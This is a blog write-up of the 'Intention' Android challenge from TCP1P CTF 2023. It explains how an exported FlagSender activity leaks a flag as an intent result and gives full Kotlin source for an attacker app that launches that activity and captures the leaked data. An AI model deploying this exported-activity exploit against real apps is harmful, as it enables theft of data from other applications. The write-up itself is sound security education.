<!doctype html><html lang=en-us><head><link rel=stylesheet href=/styles.css><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>TCP1P CTF 2023 | Alberto Giust</title><link rel=canonical href=https://blog.alright21.me/ctf/tcp1pctf/><meta name=description content="Hi, I am Alberto Giust, aka `alright(21)?`, penetration tester at Spike Reply and security enthusiast. In this website you will find CTF writeups and other interesting things I want to document about my journey through the magical world of Cybersecurity."><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://blog.alright21.me/ctf/tcp1pctf/"><meta property="og:site_name" content="Alberto Giust"><meta property="og:title" content="TCP1P CTF 2023"><meta property="og:description" content='Write-ups for TCP1P CTF 2023.
Challenges Intention Challenges Intention Category Points Solves Mobile 356 13 Challenge Description Approach The challenge presents an interesting setup compared to regular mobile challenges: we are asked to create a malicious app that exploits it inside an emulator, great idea!
The application has two activities: MainActivity, where nothing happens, and a FlagSender, where the content of flag.txt file is set as an intent result and sent back to the caller. The AndroidManifest.xml also suggests what should be the approach of exploiting this challenge: FlagSender activity is exported, so we are able to start it from an external application, and retrieve the intent result (set with setResult(-1, getIntent().putExtra("flag", flag));). We have everything we need in theory, but we need to create a malicious application to install in the emulator in order to exploit it.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2023-10-17T08:53:58+02:00"><meta property="article:modified_time" content="2023-10-17T08:53:58+02:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="TCP1P CTF 2023"><meta name=twitter:description content='Write-ups for TCP1P CTF 2023.
Challenges Intention Challenges Intention Category Points Solves Mobile 356 13 Challenge Description Approach The challenge presents an interesting setup compared to regular mobile challenges: we are asked to create a malicious app that exploits it inside an emulator, great idea!
The application has two activities: MainActivity, where nothing happens, and a FlagSender, where the content of flag.txt file is set as an intent result and sent back to the caller. The AndroidManifest.xml also suggests what should be the approach of exploiting this challenge: FlagSender activity is exported, so we are able to start it from an external application, and retrieve the intent result (set with setResult(-1, getIntent().putExtra("flag", flag));). We have everything we need in theory, but we need to create a malicious application to install in the emulator in order to exploit it.'><link rel=stylesheet href=https://blog.alright21.me/css/styles.e282735e308195f4ba7bde9c23d7b770c438e682fdb8dd70ed9a1cc443b0ba4ce94a817547eb664fefe53bc615142aa923a0f8f94bb58b5f2441d213e6d7d0a9.css integrity="sha512-4oJzXjCBlfS6e96cI9e3cMQ45oL9uN1w7ZocxEOwukzpSoF1R+tmT+/lO8YVFCqpI6D4+Uu1i18kQdIT5tfQqQ=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://blog.alright21.me/favicon.ico><div id=cookie-notice><span>We would like to use third party cookies and scripts to improve the
functionality of this website.</span>
<a id=cookie-notice-accept class="btn btn-primary btn-sm">Approve</a>
<a id=cookie-notice-deny class="btn btn-primary btn-sm">Deny</a>
<a href=/privacy id=cookie-notice-privacy class="btn btn-primary btn-sm">More info</a><br><span id=cookie-credits>Credits to this banner: <a id=cookie-notice-privacy href=https://github.com/Kudos01>Kudos01</a></div></div><script>function createCookie(e,t,n){var s,o="";n&&(s=new Date,s.setTime(s.getTime()+n*24*60*60*1e3),o="; expires="+s.toUTCString()),document.cookie=e+"="+t+o+"; path=/"}function readCookie(e){for(var t,s=e+"=",o=document.cookie.split(";"),n=0;n<o.length;n++){for(t=o[n];t.charAt(0)==" ";)t=t.substring(1,t.length);if(t.indexOf(s)==0)return t.substring(s.length,t.length)}return null}function eraseCookie(e){createCookie(e,"",-1)}if(readCookie("cookie-notice-option")=="true"){function loadScriptAsync(e,t){if(typeof t!="function")throw new Error("Not a valid callback for async script load");var n=document.createElement("script");n.onload=t,n.src=e,document.head.appendChild(n)}loadScriptAsync("https://www.googletagmanager.com/gtag/js?id=G-7KVTDGPL67",function(){window.dataLayer=window.dataLayer||[];function e(){dataLayer.push(arguments)}e("js",new Date),e("config","G-7KVTDGPL67",{anonymize_ip:!0})})}else readCookie("cookie-notice-option")!="false"&&(document.getElementById("cookie-notice").style.display="block");document.getElementById("cookie-notice-accept").addEventListener("click",function(){createCookie("cookie-notice-option","true",31),document.getElementById("cookie-notice").style.display="none",location.reload()}),document.getElementById("cookie-notice-deny").addEventListener("click",function(){createCookie("cookie-notice-option","false",31),document.getElementById("cookie-notice").style.display="none",location.reload()})</script></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><header id=header><a href=https://blog.alright21.me/><div id=logo style=background-image:url(https://blog.alright21.me/images/logo.png)></div><div id=title><h1>Alberto Giust</h1></div></a><div id=nav><ul><li class=icon><a href=# aria-label=Menu><i class="fas fa-bars fa-2x" aria-hidden=true></i></a></li><li><a href=/>Home</a></li><li><a href=/security>Security</a></li><li><a href=/ctf>CTFs</a></li><li><a href=/education>Education</a></li><li><a href=/dev>Dev</a></li><li><a href=/about>About</a></li></ul></div></header><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">TCP1P CTF 2023</h1><div class=meta><div class=postdate><time datetime="2023-10-17 08:53:58 +0200 +0200" itemprop=datePublished>2023-10-17</time></div><div class=article-read-time><i class="far fa-clock"></i>
3 minute read</div></div></header><div class=content itemprop=articleBody><p>Write-ups for <a href=https://ctf.tcp1p.com/>TCP1P</a> CTF 2023.</p><ul><li><a href=#challenges>Challenges</a><ul><li><a href=#intention>Intention</a></li></ul></li></ul><h2 id=challenges>Challenges</h2><h3 id=intention>Intention</h3><table><thead><tr><th style=text-align:center><strong>Category</strong></th><th style=text-align:center><strong>Points</strong></th><th style=text-align:center><strong>Solves</strong></th></tr></thead><tbody><tr><td style=text-align:center>Mobile</td><td style=text-align:center>356</td><td style=text-align:center>13</td></tr></tbody></table><h4 id=challenge-description>Challenge Description</h4><figure style=margin-left:0><img src=/assets/tcp1p_intention_description.png alt="intention description" style=width:60%;float:left><figcaption></figcaption></figure><h4 id=approach>Approach</h4><p>The challenge presents an interesting setup compared to regular mobile challenges: we are asked to create a malicious app that exploits it inside an emulator, great idea!</p><p>The application has two activities: MainActivity, where nothing happens, and a FlagSender, where the content of <code>flag.txt</code> file is set as an intent result and sent back to the caller. The AndroidManifest.xml also suggests what should be the approach of exploiting this challenge: FlagSender activity is exported, so we are able to start it from an external application, and retrieve the intent result (set with <code>setResult(-1, getIntent().putExtra("flag", flag));</code>). We have everything we need in theory, but we need to create a malicious application to install in the emulator in order to exploit it.</p><figure><img src=/assets/tcp1p_intention_flagSender.png alt="intention flagSender" style=width:100%><figcaption>FlagSender activity sets the result value to the flag</figcaption></figure><p>I decided to use Android&rsquo;s new development framework: Kotlin with Jetpack Compose. The idea to exploit the application is the following:</p><ol><li>create an activity with a button that redirects the user to the FlagSender activity</li><li>prepare a listener on the result received when the FlagSender activity is closed</li><li>catch the result, parse the result code and get the data</li><li>display the data in the app (or in my case, copy it to the clipboard)</li></ol><p>The following code is what it is necessary in the malicious application to work properly.</p><p><strong>MainActivity.kt</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Kotlin data-lang=Kotlin><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>package</span> com.example.intention_solve1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.R.attr.label
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.R.attr.text
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.ClipData
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.ClipboardManager
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.ComponentName
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.Context
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.Intent
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.content.pm.PackageManager
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.os.Bundle
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> android.util.Log
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.activity.ComponentActivity
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.activity.compose.setContent
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.activity.result.ActivityResultLauncher
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.activity.result.contract.ActivityResultContracts
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.foundation.layout.Arrangement
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.foundation.layout.Column
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.foundation.layout.fillMaxSize
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.foundation.layout.padding
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.material3.Button
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.material3.MaterialTheme
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.material3.Surface
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.material3.Text
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.runtime.Composable
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.runtime.getValue
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.runtime.mutableStateOf
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.runtime.remember
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.runtime.setValue
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.ui.Alignment
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.ui.Modifier
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.ui.tooling.preview.Preview
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> androidx.compose.ui.unit.dp
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> com.example.intention_solve1.ui.theme.Intention_solve1Theme
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> : ComponentActivity() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>lateinit</span> <span style=color:#66d9ef>var</span> flagSenderLauncher: ActivityResultLauncher&lt;Intent&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>onCreate</span>(savedInstanceState: Bundle?) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.onCreate(savedInstanceState)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        flagSenderLauncher = registerForActivityResult(ActivityResultContracts
</span></span><span style=display:flex><span>            .StartActivityForResult()) { result <span style=color:#f92672>-&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (result.resultCode <span style=color:#f92672>==</span> -<span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>val</span> resultString = result.<span style=color:#66d9ef>data</span><span style=color:#f92672>?.</span>getStringExtra(<span style=color:#e6db74>&#34;flag&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;FLAG&#34;</span>, resultString <span style=color:#f92672>?:</span> <span style=color:#e6db74>&#34;CANT GET FLAG&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                copyToClipboard(resultString<span style=color:#f92672>?:</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (result.resultCode <span style=color:#f92672>==</span> RESULT_CANCELED) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;ERROR&#34;</span>, <span style=color:#e6db74>&#34;RESULT CANCELED&#34;</span>)
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        setContent {
</span></span><span style=display:flex><span>            Intention_solve1Theme {
</span></span><span style=display:flex><span>                <span style=color:#75715e>// A surface container using the &#39;background&#39; color from the theme
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>var</span> resultString <span style=color:#66d9ef>by</span> remember {
</span></span><span style=display:flex><span>                    mutableStateOf(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                Surface(
</span></span><span style=display:flex><span>                    modifier = <span style=color:#a6e22e>Modifier</span>.fillMaxSize(),
</span></span><span style=display:flex><span>                    color = <span style=color:#a6e22e>MaterialTheme</span>.colorScheme.background
</span></span><span style=display:flex><span>                ) {
</span></span><span style=display:flex><span>                    Column(
</span></span><span style=display:flex><span>                        modifier = Modifier
</span></span><span style=display:flex><span>                            .fillMaxSize()
</span></span><span style=display:flex><span>                            .padding(<span style=color:#ae81ff>16.</span>dp),
</span></span><span style=display:flex><span>                        verticalArrangement = <span style=color:#a6e22e>Arrangement</span>.Center,
</span></span><span style=display:flex><span>                        horizontalAlignment = <span style=color:#a6e22e>Alignment</span>.CenterHorizontally
</span></span><span style=display:flex><span>                    ) {
</span></span><span style=display:flex><span>                        Button(
</span></span><span style=display:flex><span>                            onClick = {
</span></span><span style=display:flex><span>                                launchFlagSenderActivity()
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                        ) {
</span></span><span style=display:flex><span>                            Text(<span style=color:#e6db74>&#34;Open FlagSender Activity&#34;</span>)
</span></span><span style=display:flex><span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>copyToClipboard</span>(text: String) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> clipboardManager: ClipboardManager =
</span></span><span style=display:flex><span>            getSystemService(<span style=color:#a6e22e>Context</span>.CLIPBOARD_SERVICE) <span style=color:#66d9ef>as</span> ClipboardManager
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> clipData = <span style=color:#a6e22e>ClipData</span>.newPlainText(<span style=color:#e6db74>&#34;Flag&#34;</span>, text)
</span></span><span style=display:flex><span>        clipboardManager.setPrimaryClip(clipData)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;Clipboard&#34;</span>, <span style=color:#e6db74>&#34;Text copied to clipboard: </span><span style=color:#e6db74>$text</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>launchFlagSenderActivity</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> targetPackageName = <span style=color:#e6db74>&#34;com.kuro.intention&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (isAppInstalled(targetPackageName)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>val</span> intent = Intent().apply {
</span></span><span style=display:flex><span>                component = ComponentName(targetPackageName, 
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;com.kuro.intention.FlagSender&#34;</span>)
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            flagSenderLauncher.launch(intent)
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>Log</span>.e(<span style=color:#e6db74>&#34;ERROR&#34;</span>, <span style=color:#e6db74>&#34;APP NOT INSTALLED&#34;</span>)
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>fun</span> <span style=color:#a6e22e>isAppInstalled</span>(packageName: String): Boolean {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> packageManager: PackageManager = packageManager
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>val</span> intent = packageManager.getLaunchIntentForPackage(packageName)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> intent <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The most interesting part is the <code>flagSenderLauncher</code>, a component used to register the result value of the activity called, so that we are able to parse it. If you are unfamiliar with Jetpack Compose, we use <code>setContent</code> to declare our UI, instead of using XML and retrieving its component. The <code>onClick</code> method is associated to <code>launchFlagSenderActivity()</code>, which controls that the app is installed and opens it. <code>copyToClipboard()</code> is used to copy the result data into the clipboard. I decided to use this approach because the emulator has an easy way to share the clipboard with our laptop.</p><p>We also need to add a <code>&lt;queries></code> tag in the AndroidManifest of our application when working with Android 11 or later, to be able to call the challenge application (see <a href=https://developer.android.com/training/package-visibility/declaring>this</a> article for more details).</p><p><strong>AndroidManifest.xml</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>...
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/application&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;queries&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;package</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.kuro.intention&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/queries&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/manifest&gt;</span>
</span></span></code></pre></div><p>The final result is shown in the image below: the flag is saved in the clipboard, so we are able to copy it easily!</p><figure styple=text-align:left><img src=/assets/tcp1p_intention_result.png alt="intention result" style=width:60%><figcaption>The flag is shown in the device clipboard</figcaption></figure><h4 id=reflection>Reflection</h4><p>It was an interesting challenge, and it was the first one I solved that required developing an app. I struggled a bit in designing the app because it was new to me, but I learned a lot! I am also fascinated by the architecture of the challenge, using a container and an emulator that we can interact with using the browser üòç</p><h1 id=credits>Credits</h1><p>This template was based on <a href=https://github.com/RyanNgCT/CTF-Writeup-Template>RyanNgCT/CTF-Writeup-Template</a></p></div></article><footer id=footer><div class=footer-left>Copyright &copy; 2025 Alberto Giust</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/security>Security</a></li><li><a href=/ctf>CTFs</a></li><li><a href=/education>Education</a></li><li><a href=/dev>Dev</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script></html>